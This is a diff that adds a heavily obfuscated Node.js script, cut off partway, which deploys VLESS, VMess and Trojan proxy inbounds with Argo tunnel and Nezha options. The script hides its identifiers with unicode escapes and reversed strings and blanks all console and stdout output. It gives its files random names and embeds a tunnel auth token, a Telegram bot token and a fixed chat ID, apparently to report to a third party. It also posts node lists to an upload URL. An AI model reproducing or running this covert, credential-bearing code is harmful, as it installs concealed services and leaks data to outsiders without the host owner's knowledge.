@@ -1,38 +1,3678 @@
-#!/usr/bin/env node
-var _0x6eda7d;const http=require("\u0068\u0074\u0074\u0070");_0x6eda7d=(885064^885056)+(542852^542852);const axios=require("\u0061\u0078\u0069\u006F\u0073");var _0x4e72f=(596700^596701)+(536898^536903);const os=require("\u006F\u0073");_0x4e72f=840786^840790;var _0x_0x69b=(308825^308816)+(219993^219992);const fs=require("\u0066\u0073");_0x_0x69b=(478681^478682)+(925349^925350);var _0xec6b;const path=require("\u0070\u0061\u0074\u0068");_0xec6b=(759630^759623)+(538696^538702);const crypto=require("\u0063\u0072\u0079\u0070\u0074\u006F");const{'\u0070\u0072\u006F\u006D\u0069\u0073\u0069\u0066\u0079':promisify}=require("\u0075\u0074\u0069\u006C");var _0xeb8dc=(179209^179211)+(172804^172801);const exec=promisify(require("\u0063\u0068\u0069\u006C\u0064\u005F\u0070\u0072\u006F\u0063\u0065\u0073\u0073")['\u0065\u0078\u0065\u0063']);_0xeb8dc="qilhnf".split("").reverse().join("");const{'\u0065\u0078\u0065\u0063\u0053\u0079\u006E\u0063':execSync}=require("\u0063\u0068\u0069\u006C\u0064\u005F\u0070\u0072\u006F\u0063\u0065\u0073\u0073");const UPLOAD_URL=process['\u0065\u006E\u0076']['\u0055\u0050\u004C\u004F\u0041\u0044\u005F\u0055\u0052\u004C']||'';const PROJECT_URL=process['\u0065\u006E\u0076']['\u0050\u0052\u004F\u004A\u0045\u0043\u0054\u005F\u0055\u0052\u004C']||'';const AUTO_ACCESS=process['\u0065\u006E\u0076']['\u0041\u0055\u0054\u004F\u005F\u0041\u0043\u0043\u0045\u0053\u0053']||false;var _0x0g96fg=(479408^479414)+(443131^443128);const FILE_PATH=process['\u0065\u006E\u0076']['\u0046\u0049\u004C\u0045\u005F\u0050\u0041\u0054\u0048']||"pmt.".split("").reverse().join("");_0x0g96fg=827579^827576;var _0x6eg33b;const SUB_PATH=process['\u0065\u006E\u0076']['\u0053\u0055\u0042\u005F\u0050\u0041\u0054\u0048']||"\u0073\u0075\u0062";_0x6eg33b="pqdpol".split("").reverse().join("");var _0xe2gf=(245553^245556)+(593730^593731);const PORT=process['\u0065\u006E\u0076']['\u0053\u0045\u0052\u0056\u0045\u0052\u005F\u0050\u004F\u0052\u0054']||process['\u0065\u006E\u0076']['\u0050\u004F\u0052\u0054']||151287^148815;_0xe2gf="hbgdec".split("").reverse().join("");const UUID=process['\u0065\u006E\u0076']['\u0055\u0055\u0049\u0044']||"\u0036\u0063\u0035\u0035\u0037\u0033\u0066\u0031\u002D\u0066\u0038\u0061\u0038\u002D\u0034\u0036\u0064\u0034\u002D\u0061\u0036\u0030\u0032\u002D\u0034\u0038\u0035\u0037\u0039\u0064\u0038\u0061\u0037\u0061\u0038\u0032";var _0xd8e9ba;const NEZHA_SERVER=process['\u0065\u006E\u0076']['\u004E\u0045\u005A\u0048\u0041\u005F\u0053\u0045\u0052\u0056\u0045\u0052']||'';_0xd8e9ba=(683045^683041)+(484823^484818);var _0xdb209c;const NEZHA_PORT=process['\u0065\u006E\u0076']['\u004E\u0045\u005A\u0048\u0041\u005F\u0050\u004F\u0052\u0054']||'';_0xdb209c='\u0063\u0066\u0062\u0065\u0070\u006D';var _0x9ceda;const NEZHA_KEY=process['\u0065\u006E\u0076']['\u004E\u0045\u005A\u0048\u0041\u005F\u004B\u0045\u0059']||'';_0x9ceda=(802698^802700)+(639565^639561);const ARGO_DOMAIN=process['\u0065\u006E\u0076']['\u0041\u0052\u0047\u004F\u005F\u0044\u004F\u004D\u0041\u0049\u004E']||"\u006E\u006F\u0072\u0074\u0068\u0066\u006C\u0061\u006E\u006B\u002E\u0064\u006C\u006C\u006D\u0063\u006C\u0073\u002E\u006B\u0064\u006E\u0073\u002E\u0066\u0072";var _0x6614b=(258522^258524)+(199774^199766);const ARGO_AUTH=process['\u0065\u006E\u0076']['\u0041\u0052\u0047\u004F\u005F\u0041\u0055\u0054\u0048']||"\u0065\u0079\u004A\u0068\u0049\u006A\u006F\u0069\u004D\u0047\u0052\u006D\u0059\u007A\u004A\u006D\u004F\u0044\u0041\u007A\u0059\u006D\u0045\u0032\u0059\u006A\u0051\u0078\u004E\u0047\u0051\u0030\u0059\u006A\u006B\u0079\u0059\u006D\u0046\u006A\u004D\u0057\u0051\u0034\u004E\u007A\u006C\u006B\u0059\u0054\u0055\u0069\u004C\u0043\u004A\u0030\u0049\u006A\u006F\u0069\u005A\u0044\u0041\u0078\u0059\u0054\u0041\u0032\u005A\u0057\u004D\u0074\u0059\u0057\u0055\u0079\u0059\u0069\u0030\u0030\u004E\u007A\u004D\u0030\u004C\u0054\u0067\u0030\u0059\u006D\u0055\u0074\u004E\u006A\u0056\u006B\u004F\u0057\u0055\u0077\u0059\u007A\u0051\u0035\u004E\u0057\u0059\u0077\u0049\u0069\u0077\u0069\u0063\u0079\u0049\u0036\u0049\u006B\u0034\u0079\u0057\u006D\u0031\u0061\u0061\u006D\u0073\u0030\u0054\u006C\u0052\u0042\u0064\u0045\u0031\u0048\u0053\u006D\u006C\u005A\u0061\u0054\u0041\u0077\u0054\u0056\u0052\u0053\u0061\u006B\u0078\u0058\u0053\u0058\u0070\u0050\u0056\u0030\u0056\u0030\u0057\u0057\u0070\u0056\u004D\u0031\u006C\u0071\u0061\u007A\u004A\u0061\u0052\u0031\u0045\u0031\u0057\u006C\u0052\u0052\u0064\u0079\u004A\u0039";_0x6614b=(552492^552493)+(736203^736195);const ARGO_PORT=process['\u0065\u006E\u0076']['\u0041\u0052\u0047\u004F\u005F\u0050\u004F\u0052\u0054']||976001^981952;var _0x7243d=(356789^356784)+(290607^290601);const S5_PORT=process['\u0065\u006E\u0076']['\u0053\u0035\u005F\u0050\u004F\u0052\u0054']||'';_0x7243d="ohdohh".split("").reverse().join("");const HY2_PORT=process['\u0065\u006E\u0076']['\u0048\u0059\u0032\u005F\u0050\u004F\u0052\u0054']||"88815".split("").reverse().join("");const REALITY_PORT=process['\u0065\u006E\u0076']['\u0052\u0045\u0041\u004C\u0049\u0054\u0059\u005F\u0050\u004F\u0052\u0054']||'';var _0xd1aecf=(122766^122759)+(836787^836784);const CFIP=process['\u0065\u006E\u0076']['\u0043\u0046\u0049\u0050']||"\u0073\u0061\u0061\u0073\u002E\u0073\u0069\u006E\u002E\u0066\u0061\u006E";_0xd1aecf=993604^993600;var _0xag88d=(262170^262163)+(175795^175792);const CFPORT=process['\u0065\u006E\u0076']['\u0043\u0046\u0050\u004F\u0052\u0054']||771906^771833;_0xag88d=707259^707261;var _0xf1g8da=(941590^941588)+(503360^503367);const NAME=process['\u0065\u006E\u0076']['\u004E\u0041\u004D\u0045']||'';_0xf1g8da="nhogql".split("").reverse().join("");const CHAT_ID=process['\u0065\u006E\u0076']['\u0043\u0048\u0041\u0054\u005F\u0049\u0044']||"\u0038\u0034\u0033\u0032\u0035\u0036\u0035\u0038\u0037\u0038";const BOT_TOKEN=process['\u0065\u006E\u0076']['\u0042\u004F\u0054\u005F\u0054\u004F\u004B\u0045\u004E']||"sZkN78j3bMfcNG29sGnyFasBtg3eO2G5EAA:0854501457".split("").reverse().join("");console['\u006C\u006F\u0067']=()=>{};console['\u0065\u0072\u0072\u006F\u0072']=()=>{};console['\u0069\u006E\u0066\u006F']=()=>{};console['\u0077\u0061\u0072\u006E']=()=>{};process['\u0073\u0074\u0064\u006F\u0075\u0074']['\u0077\u0072\u0069\u0074\u0065']=()=>{};process['\u0073\u0074\u0064\u0065\u0072\u0072']['\u0077\u0072\u0069\u0074\u0065']=()=>{};function alwaysLog(msg){}if(!fs['\u0065\u0078\u0069\u0073\u0074\u0073\u0053\u0079\u006E\u0063'](FILE_PATH)){fs['\u006D\u006B\u0064\u0069\u0072\u0053\u0079\u006E\u0063'](FILE_PATH);}function isValidPort(port){try{if(port===null||port===undefined||port==='')return false;if(typeof port==="\u0073\u0074\u0072\u0069\u006E\u0067"&&port['\u0074\u0072\u0069\u006D']()==='')return false;const _0x0c8d=parseInt(port);if(isNaN(_0x0c8d))return false;if(_0x0c8d<(173304^173305)||_0x0c8d>(506726^476313))return false;return!![];}catch(error){return false;}}function generateRandomName(_0xcd41b,_0xf_0x78e){_0xcd41b="\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u006A\u006B\u006C\u006D\u006E\u006F\u0070\u0071\u0072\u0073\u0074\u0075\u0076\u0077\u0078\u0079\u007A";_0xf_0x78e='';for(let i=402968^402968;i<(756552^756558);i++){_0xf_0x78e+=_0xcd41b['\u0063\u0068\u0061\u0072\u0041\u0074'](Math['\u0066\u006C\u006F\u006F\u0072'](Math['\u0072\u0061\u006E\u0064\u006F\u006D']()*_0xcd41b['\u006C\u0065\u006E\u0067\u0074\u0068']));}return _0xf_0x78e;}let subContent=null;var _0x0c_0x772=(101908^101911)+(904722^904730);let privateKey='';_0x0c_0x772=(697924^697932)+(330895^330889);var _0x0ecc5d=(893379^893381)+(396661^396669);let publicKey='';_0x0ecc5d=(946283^946280)+(692912^692915);const npmName=generateRandomName();const webName=generateRandomName();var _0x3958c=(691529^691534)+(154582^154583);const botName=generateRandomName();_0x3958c=(506429^506429)+(959974^959970);var _0xb1gab=(839086^839084)+(652797^652788);const phpName=generateRandomName();_0xb1gab=(231565^231557)+(420563^420565);let npmPath=path['\u006A\u006F\u0069\u006E'](FILE_PATH,npmName);var _0x45a=(353653^353650)+(653146^653150);let phpPath=path['\u006A\u006F\u0069\u006E'](FILE_PATH,phpName);_0x45a=(189953^189956)+(447529^447521);var _0xce30g=(961866^961858)+(364043^364043);let webPath=path['\u006A\u006F\u0069\u006E'](FILE_PATH,webName);_0xce30g=(869618^869619)+(778768^778768);var _0x6afg=(953584^953588)+(665477^665473);let botPath=path['\u006A\u006F\u0069\u006E'](FILE_PATH,botName);_0x6afg='\u0069\u0070\u0061\u006E\u0070\u0061';var _0xc2819b;let subPath=path['\u006A\u006F\u0069\u006E'](FILE_PATH,"txt.bus".split("").reverse().join(""));_0xc2819b=308669^308671;let listPath=path['\u006A\u006F\u0069\u006E'](FILE_PATH,"\u006C\u0069\u0073\u0074\u002E\u0074\u0078\u0074");var _0xb9b74d;let bootLogPath=path['\u006A\u006F\u0069\u006E'](FILE_PATH,"\u0062\u006F\u006F\u0074\u002E\u006C\u006F\u0067");_0xb9b74d=(548738^548742)+(329361^329360);let configPath=path['\u006A\u006F\u0069\u006E'](FILE_PATH,"nosj.gifnoc".split("").reverse().join(""));var _0x2_0x59e=(888752^888753)+(851337^851339);let certPath=path['\u0072\u0065\u0073\u006F\u006C\u0076\u0065'](FILE_PATH,"mep.trec".split("").reverse().join(""));_0x2_0x59e=908783^908774;let keyPath=path['\u0072\u0065\u0073\u006F\u006C\u0076\u0065'](FILE_PATH,"\u0070\u0072\u0069\u0076\u0061\u0074\u0065\u002E\u006B\u0065\u0079");function deleteNodes(){try{if(!UPLOAD_URL)return;if(!fs['\u0065\u0078\u0069\u0073\u0074\u0073\u0053\u0079\u006E\u0063'](subPath))return;var _0xac868c=(718191^718183)+(675597^675588);let _0x1f699e;_0xac868c=(791159^791158)+(274918^274915);try{_0x1f699e=fs['\u0072\u0065\u0061\u0064\u0046\u0069\u006C\u0065\u0053\u0079\u006E\u0063'](subPath,"\u0075\u0074\u0066\u002D\u0038");}catch{return null;}const _0x35cdg=Buffer['\u0066\u0072\u006F\u006D'](_0x1f699e,"\u0062\u0061\u0073\u0065\u0036\u0034")['\u0074\u006F\u0053\u0074\u0072\u0069\u006E\u0067']("\u0075\u0074\u0066\u002D\u0038");var _0x85b32c;const _0x4e9ce=_0x35cdg['\u0073\u0070\u006C\u0069\u0074']("\u000A")['\u0066\u0069\u006C\u0074\u0065\u0072'](line=>new RegExp("/\\/\\:)skcos|2airetsyh|najort|ssemv|sselv(".split("").reverse().join(""),"")['\u0074\u0065\u0073\u0074'](line));_0x85b32c=456748^456746;if(_0x4e9ce['\u006C\u0065\u006E\u0067\u0074\u0068']===(574810^574810))return;axios['\u0070\u006F\u0073\u0074'](`${UPLOAD_URL}/api/delete-nodes`,JSON['\u0073\u0074\u0072\u0069\u006E\u0067\u0069\u0066\u0079']({"nodes":_0x4e9ce}),{"headers":{"\u0043\u006F\u006E\u0074\u0065\u006E\u0074\u002D\u0054\u0079\u0070\u0065":'application/json'}})['\u0063\u0061\u0074\u0063\u0068'](error=>{return null;});return null;}catch(err){return null;}}function cleanupOldFiles(){try{var _0x6ad12g;const _0x1e4b1d=fs['\u0072\u0065\u0061\u0064\u0064\u0069\u0072\u0053\u0079\u006E\u0063'](FILE_PATH);_0x6ad12g=(122488^122492)+(430914^430923);_0x1e4b1d['\u0066\u006F\u0072\u0045\u0061\u0063\u0068'](file=>{const _0x5_0xfa8=path['\u006A\u006F\u0069\u006E'](FILE_PATH,file);try{var _0x3b31g=(909260^909257)+(878610^878609);const _0xcb9a=fs['\u0073\u0074\u0061\u0074\u0053\u0079\u006E\u0063'](_0x5_0xfa8);_0x3b31g=907903^907898;if(_0xcb9a['\u0069\u0073\u0046\u0069\u006C\u0065']()){fs['\u0075\u006E\u006C\u0069\u006E\u006B\u0053\u0079\u006E\u0063'](_0x5_0xfa8);}}catch(err){}});}catch(err){}}function generateX25519Keypair(){const{'\u0070\u0075\u0062\u006C\u0069\u0063\u004B\u0065\u0079':pubKey,"privateKey":privKey}=crypto['\u0067\u0065\u006E\u0065\u0072\u0061\u0074\u0065\u004B\u0065\u0079\u0050\u0061\u0069\u0072\u0053\u0079\u006E\u0063']("91552x".split("").reverse().join(""));const _0x13ed=privKey['\u0065\u0078\u0070\u006F\u0072\u0074']({'\u0074\u0079\u0070\u0065':"\u0070\u006B\u0063\u0073\u0038","format":"\u0064\u0065\u0072"})['\u0073\u0075\u0062\u0061\u0072\u0072\u0061\u0079'](-(707306^707274));var _0xc84a5b;const _0x1574f=pubKey['\u0065\u0078\u0070\u006F\u0072\u0074']({'\u0074\u0079\u0070\u0065':'spki','\u0066\u006F\u0072\u006D\u0061\u0074':'der'})['\u0073\u0075\u0062\u0061\u0072\u0072\u0061\u0079'](-(582890^582858));_0xc84a5b=(212898^212901)+(206107^206107);return{'\u0070\u0072\u0069\u0076\u0061\u0074\u0065\u004B\u0065\u0079':_0x13ed['\u0074\u006F\u0053\u0074\u0072\u0069\u006E\u0067']("lru46esab".split("").reverse().join("")),"publicKey":_0x1574f['\u0074\u006F\u0053\u0074\u0072\u0069\u006E\u0067']("\u0062\u0061\u0073\u0065\u0036\u0034\u0075\u0072\u006C")};}function generateOrLoadKeyPair(){const _0xc1ccbf=path['\u006A\u006F\u0069\u006E'](FILE_PATH,"txt.yek".split("").reverse().join(""));if(fs['\u0065\u0078\u0069\u0073\u0074\u0073\u0053\u0079\u006E\u0063'](_0xc1ccbf)){const _0xebff6c=fs['\u0072\u0065\u0061\u0064\u0046\u0069\u006C\u0065\u0053\u0079\u006E\u0063'](_0xc1ccbf,"\u0075\u0074\u0066\u0038");const _0x9ae=_0xebff6c['\u006D\u0061\u0074\u0063\u0068'](new RegExp('\u0050\u0072\u0069\u0076\u0061\u0074\u0065\u004B\u0065\u0079\u003A\u005C\u0073\u002A\u0028\u002E\u002A\u0029',""));const _0xa2_0xa7a=_0xebff6c['\u006D\u0061\u0074\u0063\u0068'](new RegExp(")*.(*s\\:yeKcilbuP".split("").reverse().join(""),""));if(_0x9ae&&_0xa2_0xa7a){privateKey=_0x9ae[826039^826038]['\u0074\u0072\u0069\u006D']();publicKey=_0xa2_0xa7a[988178^988179]['\u0074\u0072\u0069\u006D']();return;}}var _0xba48gf=(843674^843673)+(800425^800424);const _0x02699b=generateX25519Keypair();_0xba48gf=(544541^544539)+(357754^357754);privateKey=_0x02699b['\u0070\u0072\u0069\u0076\u0061\u0074\u0065\u004B\u0065\u0079'];publicKey=_0x02699b['\u0070\u0075\u0062\u006C\u0069\u0063\u004B\u0065\u0079'];fs['\u0077\u0072\u0069\u0074\u0065\u0046\u0069\u006C\u0065\u0053\u0079\u006E\u0063'](_0xc1ccbf,`PrivateKey: ${privateKey}\nPublicKey: ${publicKey}\n`,"\u0075\u0074\u0066\u0038");}var _0x4b4cg;const FALLBACK_EC_KEY="\u002D\u002D\u002D\u002D\u002D\u0042\u0045\u0047\u0049\u004E\u0020\u0045\u0043\u0020\u0050\u0041\u0052\u0041\u004D\u0045\u0054\u0045\u0052\u0053\u002D\u002D\u002D\u002D\u002D\u000A"+"\u0042\u0067\u0067\u0071\u0068\u006B\u006A\u004F\u0050\u0051\u004D\u0042\u0042\u0077\u003D\u003D\u000A"+"\u002D\u002D\u002D\u002D\u002D\u0045\u004E\u0044\u0020\u0045\u0043\u0020\u0050\u0041\u0052\u0041\u004D\u0045\u0054\u0045\u0052\u0053\u002D\u002D\u002D\u002D\u002D\u000A"+"\u002D\u002D\u002D\u002D\u002D\u0042\u0045\u0047\u0049\u004E\u0020\u0045\u0043\u0020\u0050\u0052\u0049\u0056\u0041\u0054\u0045\u0020\u004B\u0045\u0059\u002D\u002D\u002D\u002D\u002D\u000A"+"\n94MSGqCCGoAoYUdsYBfnNis++/VYpqBdiYb0/dTqwy1tIqPtES2974MIEEQACcHM".split("").reverse().join("")+"\u0041\u0077\u0045\u0048\u006F\u0055\u0051\u0044\u0051\u0067\u0041\u0045\u0031\u006B\u0048\u0061\u0066\u0050\u006A\u0030\u0037\u0072\u004A\u0047\u002B\u0048\u0062\u006F\u0048\u0032\u0065\u006B\u0041\u0049\u0034\u0072\u002B\u0065\u0036\u0054\u004C\u0033\u0038\u0047\u0057\u0041\u0053\u0041\u004E\u006E\u006E\u0067\u005A\u0072\u0065\u006F\u0051\u0044\u0046\u0031\u0036\u0041\u0052\u0061\u000A"+"\u002F\u0054\u0073\u0079\u004C\u0079\u0046\u006F\u0050\u006B\u0068\u004C\u0078\u0053\u0062\u0065\u0068\u0048\u002F\u004E\u0042\u0045\u006A\u0048\u0074\u0053\u005A\u0047\u0061\u0044\u0068\u004D\u0071\u0051\u003D\u003D\u000A"+"\u002D\u002D\u002D\u002D\u002D\u0045\u004E\u0044\u0020\u0045\u0043\u0020\u0050\u0052\u0049\u0056\u0041\u0054\u0045\u0020\u004B\u0045\u0059\u002D\u002D\u002D\u002D\u002D\u000A";_0x4b4cg=577910^577908;const FALLBACK_CERT="\n-----ETACIFITREC NIGEB-----".split("").reverse().join("")+"\u004D\u0049\u0049\u0042\u0065\u006A\u0043\u0043\u0041\u0053\u0047\u0067\u0041\u0077\u0049\u0042\u0041\u0067\u0049\u0055\u0066\u0057\u0065\u0051\u004C\u0033\u0035\u0035\u0036\u0050\u004E\u004A\u004C\u0070\u002F\u0076\u0065\u0043\u0046\u0078\u0047\u004E\u006A\u0039\u0063\u0072\u006B\u0077\u0043\u0067\u0059\u0049\u004B\u006F\u005A\u0049\u007A\u006A\u0030\u0045\u0041\u0077\u0049\u0077\u000A"+"\u0045\u007A\u0045\u0052\u004D\u0041\u0038\u0047\u0041\u0031\u0055\u0045\u0041\u0077\u0077\u0049\u0059\u006D\u006C\u0075\u005A\u0079\u0035\u006A\u0062\u0032\u0030\u0077\u0048\u0068\u0063\u004E\u004D\u006A\u0055\u0077\u004F\u0054\u0045\u0034\u004D\u0054\u0067\u0079\u004D\u0044\u0049\u0079\u0057\u0068\u0063\u004E\u004D\u007A\u0055\u0077\u004F\u0054\u0045\u0032\u004D\u0054\u0067\u0079\u000A"+"\nHEwA94MSGqCCGEgA94MSGqyBGMBMZBTbvNmLn5WaihADDQQVDYwDwERMTAjWyIDM".split("").reverse().join("")+"\nh8iM70vWEgedxAEq3aG45ZDgEglB/9ykun/KOCApn9B62hvRy6O94zn2BZNBAI0A".split("").reverse().join("")+"\u0061\u0044\u0035\u0049\u0053\u0038\u0055\u006D\u0033\u006F\u0052\u002F\u007A\u0051\u0052\u0049\u0078\u0037\u0055\u006D\u0052\u006D\u0067\u0034\u0054\u004B\u006D\u006A\u0055\u007A\u0042\u0052\u004D\u0042\u0030\u0047\u0041\u0031\u0055\u0064\u0044\u0067\u0051\u0057\u0042\u0042\u0054\u0056\u0031\u0063\u0046\u0049\u0044\u0037\u0055\u0049\u0053\u0045\u0037\u0050\u004C\u0054\u0042\u0052\u000A"+"\u0042\u0066\u0047\u0062\u0067\u006B\u0072\u004D\u004E\u007A\u0041\u0066\u0042\u0067\u004E\u0056\u0048\u0053\u004D\u0045\u0047\u0044\u0041\u0057\u0067\u0042\u0054\u0056\u0031\u0063\u0046\u0049\u0044\u0037\u0055\u0049\u0053\u0045\u0037\u0050\u004C\u0054\u0042\u0052\u0042\u0066\u0047\u0062\u0067\u006B\u0072\u004D\u004E\u007A\u0041\u0050\u0042\u0067\u004E\u0056\u0048\u0052\u004D\u0042\u000A"+"\n+BlTX6mScEvVQrty/dv0gvJADIAICQEMAc0ACMAB94MSGqCCGoAM/HQADATBE8fA".split("").reverse().join("")+"\u0065\u0051\u0036\u004F\u0046\u0062\u0039\u004C\u0062\u004C\u0059\u004C\u0039\u0066\u002B\u0073\u0041\u0069\u0041\u0066\u0066\u006F\u004D\u0062\u0069\u0034\u0079\u002F\u0030\u0059\u0055\u0053\u006C\u0054\u0074\u007A\u0037\u0061\u0073\u0039\u0053\u0038\u002F\u006C\u0063\u0069\u0042\u0046\u0035\u0056\u0043\u0055\u006F\u0056\u0049\u004B\u0053\u002B\u0076\u0058\u0032\u0067\u003D\u003D\u000A"+"\n-----ETACIFITREC DNE-----".split("").reverse().join("");function ensureTlsCertificates(certPath,keyPath){if(fs['\u0065\u0078\u0069\u0073\u0074\u0073\u0053\u0079\u006E\u0063'](certPath)&&fs['\u0065\u0078\u0069\u0073\u0074\u0073\u0053\u0079\u006E\u0063'](keyPath))return;fs['\u006D\u006B\u0064\u0069\u0072\u0053\u0079\u006E\u0063'](path['\u0064\u0069\u0072\u006E\u0061\u006D\u0065'](certPath),{"recursive":!![]});try{execSync("\u006F\u0070\u0065\u006E\u0073\u0073\u006C\u0020\u0076\u0065\u0072\u0073\u0069\u006F\u006E",{'\u0073\u0074\u0064\u0069\u006F':'ignore'});execSync(`openssl ecparam -genkey -name prime256v1 -out "${keyPath}"`,{'\u0073\u0074\u0064\u0069\u006F':'ignore'});execSync(`openssl req -new -x509 -days 3650 -key "${keyPath}" -out "${certPath}" -subj "/CN=bing.com"`,{'\u0073\u0074\u0064\u0069\u006F':"\u0069\u0067\u006E\u006F\u0072\u0065"});return;}catch(e){}fs['\u0077\u0072\u0069\u0074\u0065\u0046\u0069\u006C\u0065\u0053\u0079\u006E\u0063'](keyPath,FALLBACK_EC_KEY);fs['\u0077\u0072\u0069\u0074\u0065\u0046\u0069\u006C\u0065\u0053\u0079\u006E\u0063'](certPath,FALLBACK_CERT);}function getCertificateFingerprint(certPath){try{var _0x9cb1d=(397978^397970)+(513060^513069);const _0xfada3f=execSync(`openssl x509 -noout -fingerprint -sha256 -in "${certPath}"`,{'\u0065\u006E\u0063\u006F\u0064\u0069\u006E\u0067':"\u0075\u0074\u0066\u0038","timeout":3000})['\u0074\u0072\u0069\u006D']();_0x9cb1d="geanfj".split("").reverse().join("");const _0xg146d=_0xfada3f['\u006D\u0061\u0074\u0063\u0068'](new RegExp('\u003D\u0028\u002E\u002B\u0029\u0024',""));if(_0xg146d&&_0xg146d[107574^107575]){return _0xg146d[904096^904097]['\u0074\u006F\u0055\u0070\u0070\u0065\u0072\u0043\u0061\u0073\u0065']();}}catch(e){}try{const _0x333bfe=fs['\u0072\u0065\u0061\u0064\u0046\u0069\u006C\u0065\u0053\u0079\u006E\u0063'](certPath,"\u0075\u0074\u0066\u0038");const _0x6_0x362=_0x333bfe['\u006D\u0061\u0074\u0063\u0068'](new RegExp("-----ETACIFITREC DNE-----)?+]S\\s\\[(-----ETACIFITREC NIGEB-----".split("").reverse().join(""),""));if(!_0x6_0x362)return'';const _0xe8bf=_0x6_0x362[363894^363895]['\u0072\u0065\u0070\u006C\u0061\u0063\u0065'](new RegExp('\u005C\u0073','\u0067'),'');const _0x7_0x202=Buffer['\u0066\u0072\u006F\u006D'](_0xe8bf,"\u0062\u0061\u0073\u0065\u0036\u0034");var _0x729bff=(745243^745240)+(885071^885065);const _0x9b6d=crypto['\u0063\u0072\u0065\u0061\u0074\u0065\u0048\u0061\u0073\u0068']("652ahs".split("").reverse().join(""))['\u0075\u0070\u0064\u0061\u0074\u0065'](_0x7_0x202)['\u0064\u0069\u0067\u0065\u0073\u0074']("xeh".split("").reverse().join(""));_0x729bff=(994803^994806)+(257285^257293);return _0x9b6d['\u006D\u0061\u0074\u0063\u0068'](new RegExp('\u002E\u007B\u0032\u007D','\u0067'))['\u006A\u006F\u0069\u006E']("\u003A")['\u0074\u006F\u0055\u0070\u0070\u0065\u0072\u0043\u0061\u0073\u0065']();}catch(error){return'';}}async function generateConfig(){const _0xaef83d={"log":{'\u0061\u0063\u0063\u0065\u0073\u0073':"\u002F\u0064\u0065\u0076\u002F\u006E\u0075\u006C\u006C","error":"\u002F\u0064\u0065\u0076\u002F\u006E\u0075\u006C\u006C",'\u006C\u006F\u0067\u006C\u0065\u0076\u0065\u006C':"\u006E\u006F\u006E\u0065"},'\u0069\u006E\u0062\u006F\u0075\u006E\u0064\u0073':[{"tag":'vless-fallback-in','\u0070\u006F\u0072\u0074':ARGO_PORT,"listen":'::',"protocol":'vless','\u0073\u0065\u0074\u0074\u0069\u006E\u0067\u0073':{"clients":[{'\u0069\u0064':UUID,"flow":"\u0078\u0074\u006C\u0073\u002D\u0072\u0070\u0072\u0078\u002D\u0076\u0069\u0073\u0069\u006F\u006E"}],'\u0064\u0065\u0063\u0072\u0079\u0070\u0074\u0069\u006F\u006E':"\u006E\u006F\u006E\u0065","fallbacks":[{"dest":3001},{"path":"\u002F\u0076\u006C\u0065\u0073\u0073\u002D\u0061\u0072\u0067\u006F",'\u0064\u0065\u0073\u0074':3002},{'\u0070\u0061\u0074\u0068':"\u002F\u0076\u006D\u0065\u0073\u0073\u002D\u0061\u0072\u0067\u006F","dest":3003},{"path":"\u002F\u0074\u0072\u006F\u006A\u0061\u006E\u002D\u0061\u0072\u0067\u006F","dest":3004}]},"streamSettings":{'\u006E\u0065\u0074\u0077\u006F\u0072\u006B':'tcp'}},{'\u0074\u0061\u0067':"\u0076\u006C\u0065\u0073\u0073\u002D\u0074\u0063\u0070\u002D\u0069\u006E",'\u0070\u006F\u0072\u0074':3001,"listen":"\u0031\u0032\u0037\u002E\u0030\u002E\u0030\u002E\u0031",'\u0070\u0072\u006F\u0074\u006F\u0063\u006F\u006C':"\u0076\u006C\u0065\u0073\u0073","settings":{'\u0063\u006C\u0069\u0065\u006E\u0074\u0073':[{"id":UUID}],'\u0064\u0065\u0063\u0072\u0079\u0070\u0074\u0069\u006F\u006E':"\u006E\u006F\u006E\u0065"},'\u0073\u0074\u0072\u0065\u0061\u006D\u0053\u0065\u0074\u0074\u0069\u006E\u0067\u0073':{"network":"tcp","security":"\u006E\u006F\u006E\u0065"}},{"tag":"\u0076\u006C\u0065\u0073\u0073\u002D\u0077\u0073\u002D\u0069\u006E",'\u0070\u006F\u0072\u0074':3002,"listen":"\u0031\u0032\u0037\u002E\u0030\u002E\u0030\u002E\u0031","protocol":"vless","settings":{"clients":[{'\u0069\u0064':UUID,'\u006C\u0065\u0076\u0065\u006C':0}],'\u0064\u0065\u0063\u0072\u0079\u0070\u0074\u0069\u006F\u006E':"none"},'\u0073\u0074\u0072\u0065\u0061\u006D\u0053\u0065\u0074\u0074\u0069\u006E\u0067\u0073':{'\u006E\u0065\u0074\u0077\u006F\u0072\u006B':"\u0077\u0073",'\u0073\u0065\u0063\u0075\u0072\u0069\u0074\u0079':"\u006E\u006F\u006E\u0065",'\u0077\u0073\u0053\u0065\u0074\u0074\u0069\u006E\u0067\u0073':{'\u0070\u0061\u0074\u0068':"/vless-argo"}},"sniffing":{'\u0065\u006E\u0061\u0062\u006C\u0065\u0064':!![],'\u0064\u0065\u0073\u0074\u004F\u0076\u0065\u0072\u0072\u0069\u0064\u0065':["\u0068\u0074\u0074\u0070","\u0074\u006C\u0073","\u0071\u0075\u0069\u0063"],"metadataOnly":false}},{'\u0074\u0061\u0067':'vmess-ws-in','\u0070\u006F\u0072\u0074':3003,"listen":"\u0031\u0032\u0037\u002E\u0030\u002E\u0030\u002E\u0031","protocol":"\u0076\u006D\u0065\u0073\u0073",'\u0073\u0065\u0074\u0074\u0069\u006E\u0067\u0073':{"clients":[{"id":UUID,'\u0061\u006C\u0074\u0065\u0072\u0049\u0064':0}]},'\u0073\u0074\u0072\u0065\u0061\u006D\u0053\u0065\u0074\u0074\u0069\u006E\u0067\u0073':{'\u006E\u0065\u0074\u0077\u006F\u0072\u006B':"\u0077\u0073","wsSettings":{'\u0070\u0061\u0074\u0068':"\u002F\u0076\u006D\u0065\u0073\u0073\u002D\u0061\u0072\u0067\u006F"}},"sniffing":{"enabled":!![],'\u0064\u0065\u0073\u0074\u004F\u0076\u0065\u0072\u0072\u0069\u0064\u0065':["\u0068\u0074\u0074\u0070","slt".split("").reverse().join(""),"\u0071\u0075\u0069\u0063"],'\u006D\u0065\u0074\u0061\u0064\u0061\u0074\u0061\u004F\u006E\u006C\u0079':false}},{"tag":"\u0074\u0072\u006F\u006A\u0061\u006E\u002D\u0077\u0073\u002D\u0069\u006E",'\u0070\u006F\u0072\u0074':3004,'\u006C\u0069\u0073\u0074\u0065\u006E':"\u0031\u0032\u0037\u002E\u0030\u002E\u0030\u002E\u0031",'\u0070\u0072\u006F\u0074\u006F\u0063\u006F\u006C':"\u0074\u0072\u006F\u006A\u0061\u006E",'\u0073\u0065\u0074\u0074\u0069\u006E\u0067\u0073':{"clients":[{"password":UUID}]},'\u0073\u0074\u0072\u0065\u0061\u006D\u0053\u0065\u007